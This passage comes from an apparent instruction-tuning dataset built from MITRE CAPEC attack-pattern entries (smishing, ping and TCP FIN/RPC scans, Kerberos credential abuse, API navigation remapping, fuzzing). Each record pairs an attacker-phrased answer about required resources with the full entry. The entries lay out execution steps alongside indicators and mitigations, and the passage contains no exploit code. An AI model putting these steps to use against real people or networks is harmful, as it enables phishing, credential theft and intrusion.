              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to enter sensitive information on adversary's site.] An adversary sends a text message to the victim that has a call-to-action, in order to persuade the user into clicking the included link (which then takes the victim to the adversary's website) and logging in. The key is to get the victim to believe that the text message originates from a legitimate entity with which the victim does business and that the website pointed to by the URL in the text message is the legitimate website. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": "Send the user a message from a spoofed legitimate-looking mobile number that asks the user to click on the included link."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs mobile phone numbers to initiate contact with the victim.",
            "An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack."
        },
        "Indicators": {
          "Indicator": [
            "You receive a text message from an entity that you are not even a customer of prompting you to log into your account.",
            "You receive any text message that provides you with a link that takes you to a website which requires you to enter your credentials."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within text messages and do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. Safe practices also include leveraging the entity's mobile application or directly typing the entity's URL in the browser and only then logging in. Never reply to any text messages that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": "The target receives a text message stating that their Apple ID has been disabled due to suspicious activity and that they need to click on the link included in the message to log into their Apple account in order to enable it. The link in the text message looks legitimate and once the link is clicked, the login page is an exact replica of Apple's standard login page. The target supplies their login credentials and are then notified that their account has now been unlocked. However, the adversary has just collected the target's Apple account information, which can now be used by the adversary for a variety of purposes."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-590"
            },
            {
              "@External_Reference_ID": "REF-591"
            },
            {
              "@External_Reference_ID": "REF-592"
            },
            {
              "@External_Reference_ID": "REF-593"
            },
            {
              "@External_Reference_ID": "REF-696"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Alternate_Terms"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-01-09",
            "#text": "Mobile Phishing (aka MobPhishing)"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Host Discovery (CAPEC ID: 292), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.",
      "@Name": "Host Discovery (CAPEC ID: 292)",
      "attack_ptrn": {
        "@ID": "292",
        "@Name": "Host Discovery",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "169"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires logical access to the target network in order to carry out host discovery."
        },
        "Resources_Required": {
          "Resource": "The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1018",
            "Entry_Name": "Remote System Discovery"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 1: Footprinting, pp.44"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.6 Host Discover Techniques, pg.57"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP FIN Scan (CAPEC ID: 302)",
    "context": "",
    "output": "The resources required to execute TCP FIN Scan (CAPEC ID: 302) are the following: This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP FIN Scan (CAPEC ID: 302)",
      "attack_ptrn": {
        "@ID": "302",
        "@Name": "TCP FIN Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",
        "Extended_Description": {
          "xhtml:p": "In addition to its relative speed in comparison with other types of scans, the major advantage a TCP FIN Scan is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends TCP packets with the FIN flag but not associated with an existing connection to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges."
        },
        "Resources_Required": {
          "Resource": "This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected. An IDS/IPS system with heuristic algorithms is required to detect them."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 55"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-147",
              "@Section": "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Execution_Flow, Mitigations, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "TCP FIN scan"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Use of Known Kerberos Credentials (CAPEC ID: 652), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA valid Kerberos ticket or a known Kerberos service account credential.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A valid Kerberos ticket or a known Kerberos service account credential.",
      "@Name": "Use of Known Kerberos Credentials (CAPEC ID: 652)",
      "attack_ptrn": {
        "@ID": "652",
        "@Name": "Use of Known Kerberos Credentials",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.",
        "Extended_Description": {
          "xhtml:p": "Kerberos is the default authentication method for Windows domains and is also used across many operating systems. Attacks leveraging trusted Kerberos credentials can result in numerous consequences, depending on what Kerberos credential is stolen. For example, Kerberos service accounts are typically used to run services or scheduled tasks pertaining to authentication. However, these credentials are often weak and never expire, in addition to possessing local or domain administrator privileges. If an adversary is able to acquire these credentials, it could result in lateral movement within the domain or access to any resources the service account is privileged to access, among other things. Ultimately, successful spoofing and impersonation of trusted Kerberos credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "560",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.",
              "Technique": [
                "An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.",
                "An adversary guesses the credentials to a weak Kerberos service account.",
                "An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.",
                "An adversary conducts a Kerberoasting attack."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.",
              "Technique": [
                "Manually or automatically enter each Kerberos service account credential through the target's interface.",
                "Attempt a Pass the Ticket attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application leverages Kerberos authentication.",
            "The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication for Kerberos service accounts.",
            "The system/application does not have a sound password policy that is being enforced for Kerberos service accounts.",
            "The system/application does not implement an effective password throttling mechanism for authenticating to Kerberos service accounts.",
            "The targeted network allows for network sniffing attacks to succeed."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Kerberos credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A valid Kerberos ticket or a known Kerberos service account credential."
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use expired or invalid credentials.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with an account's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Create a strong password policy and ensure that your system enforces this policy for Kerberos service accounts.",
            "Ensure Kerberos service accounts are not reusing username/password combinations for multiple systems, applications, or services.",
            "Do not reuse Kerberos service account credentials across systems.",
            "Deny remote use of Kerberos service account credentials to log into domain systems.",
            "Do not allow Kerberos service accounts to be a local administrator on more than one system.",
            "Enable at least AES Kerberos encryption for tickets.",
            "Monitor system and domain logs for abnormal credential access."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]",
            "PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "836"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1558",
            "Entry_Name": "Steal or Forge Kerberos Tickets"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-584"
            },
            {
              "@External_Reference_ID": "REF-585"
            },
            {
              "@External_Reference_ID": "REF-586"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Kerberos centers around a ticketing system that is used to request/grant access to resources and to then access the requested resources. If one of these tickets is acquired, an adversary could gain access to a specific resource; access any resource a user has privileges to access; gain access to services that use Kerberos as an authentication mechanism and generate tickets to access a particular resource and the system that hosts the resource; or generate Ticket Granting Tickets (TGTs) for any domain account within Active Directory."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Notes, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description, Prerequisites"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Application API Navigation Remapping (CAPEC ID: 386)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Application API Navigation Remapping (CAPEC ID: 386):\nA software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a man-in-the-middle proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a man-in-the-middle proxy.",
      "@Name": "Application API Navigation Remapping (CAPEC ID: 386)",
      "attack_ptrn": {
        "@ID": "386",
        "@Name": "Application API Navigation Remapping",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "94"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a man-in-the-middle proxy."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "471"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "311"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Fuzzing for garnering other adjacent user/sensitive data (CAPEC ID: 261)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Fuzzing for garnering other adjacent user/sensitive data (CAPEC ID: 261):\nThe attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.",
      "@Name": "Fuzzing for garnering other adjacent user/sensitive data (CAPEC ID: 261)",
      "attack_ptrn": {
        "@ID": "261",
        "@Name": "Fuzzing for garnering other adjacent user/sensitive data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.",
        "Extended_Description": {
          "xhtml:p": "Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. If the server does not verify that the query matches one of the expected templates, an adversary who is allowed to send normal queries could modify their query to try to return additional information. The adversary may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.",
              "Technique": [
                "Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.",
                "Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.",
                "Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.",
              "Technique": [
                "Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).",
                "Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template",
              "Technique": [
                "Create variants of expected templates that request additional information",
                "Create variants that exclude limiting clauses",
                "Create variants that alter fields taht identify the requester in order to subvert access controls",
                "Repeat different fuzzing variants until sensitive information is divulged"
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates."
        },
        "Resources_Required": {
          "Resource": "The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries."
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "20"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP RPC Scan (CAPEC ID: 307)",
    "context": "",
    "output": "required resources:\nThe ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP RPC Scan (CAPEC ID: 307)",
      "attack_ptrn": {
        "@ID": "307",
        "@Name": "TCP RPC Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary scans for RPC services listing on a Unix/Linux host.",
        "Extended_Description": {
          "xhtml:p": [
            "This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well-known RPC services running on a UDP port. Discovering RPC services gives the adversary potential targets to attack, as some RPC services are insecure by default.",
            "Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types, are easily detected by IPS/IDS systems, and can only detect open ports when an RPC service responds. ICMP diagnostic message responses can help identify closed ports, however filtered and unfiltered ports cannot be identified through TCP RPC scans. There are two general approaches to RPC scanning: One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly."
          ]
        },
        "Typical_Severity": "Low",
